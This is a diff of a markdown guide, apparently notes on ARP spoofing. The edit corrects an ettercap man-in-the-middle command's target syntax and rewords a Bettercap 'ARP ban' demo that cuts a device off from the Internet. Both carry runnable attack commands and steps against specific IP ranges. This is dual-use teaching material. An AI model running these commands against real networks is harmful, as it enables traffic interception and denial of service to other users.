@@ -155,9 +155,9 @@ arpspoof $VICTIM_IP
 >         # The three delimiting slashes are required, the values are not. A missing value means "any."
 >         # If `ettercap` complains about the "wrong number" of slashes (`/`), you may have
 >         # a copy that does not have IPv6 support. See `ettercap -h | grep ^TARGET` to check target syntax.
->         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /172.22.33.50// /172.22.33.10/80
+>         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /172.22.33.50// /172.22.33.10//80
 >         ```
-> * Quick demo of Bettercap's "ARP ban" (spoofs the gateway's MAC address) that knocks a device off the LAN:
+> * Quick demo of Bettercap's "ARP ban" (spoofs the gateway's MAC address) that prevents a device from accessing the Internet:
 >     1. Launch `bettercap` with `sudo bettercap`
 >     1. Find a target: `net.show`
 >     1. Set the target (otherwise, entire subnet is the target): `set arp.spoof.targets 192.168.9.10-50`
